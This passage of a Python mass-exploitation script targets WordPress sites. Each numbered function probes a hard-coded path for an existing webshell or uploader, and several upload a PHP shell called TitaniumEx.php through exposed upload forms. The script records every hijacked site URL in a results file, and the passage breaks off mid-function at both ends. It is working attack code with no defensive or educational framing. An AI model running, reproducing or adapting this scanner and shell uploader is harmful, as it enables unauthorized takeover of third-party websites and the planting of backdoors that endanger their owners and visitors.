        upload_dir = url +"/wp-content/f0x.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X240(url):
    try:
        upload_dir = url +"0iq.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X241(url):
    try:
        upload_dir = url +"/wp-content/0iq.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X242(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpresss3cll-1/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X243(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpressh3ll/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X244(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpressh3ll-1/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X245(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpressh3ll-2/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X246(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpress3cll/up.php"
        upload_dir = url +"/wp-content/plugins/wordpress3cll/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X247(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpress3cll-1/up.php"
        upload_dir = url +"/wp-content/plugins/wordpress3cll-1/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X248(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpresss3cll-1/up.php"
        upload_dir = url +"/wp-content/plugins/wordpresss3cll-1/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X249(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpressh3ll/up.php"
        upload_dir = url +"/wp-content/plugins/wordpressh3ll/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X250(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpressh3ll-1/up.php"
        upload_dir = url +"/wp-content/plugins/wordpressh3ll-1/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X251(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpressh3ll-2/up.php"
        upload_dir = url +"/wp-content/plugins/wordpressh3ll-2/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X252(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpresssh3ll/up.php"
        upload_dir = url +"/wp-content/plugins/wordpresssh3ll/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X253(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpresssh3ll-1/up.php"
        upload_dir = url +"/wp-content/plugins/wordpresssh3ll-1/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X254(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpresssh3ll-2/up.php"
        upload_dir = url +"/wp-content/plugins/wordpresssh3ll-2/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X255(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpresss3cll/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X256(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpress3cll-1/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X257(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------212444829518202317592639615915'}
        data = '-----------------------------212444829518202317592639615915\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------212444829518202317592639615915--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/wordpresss3cll/up.php"
        upload_dir = url +"/wp-content/plugins/wordpresss3cll/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X258(url):
    try:
        upload_dir = url +"/.well-known/pki-validation/ssl.php?xsec=blocker"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="up_it"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
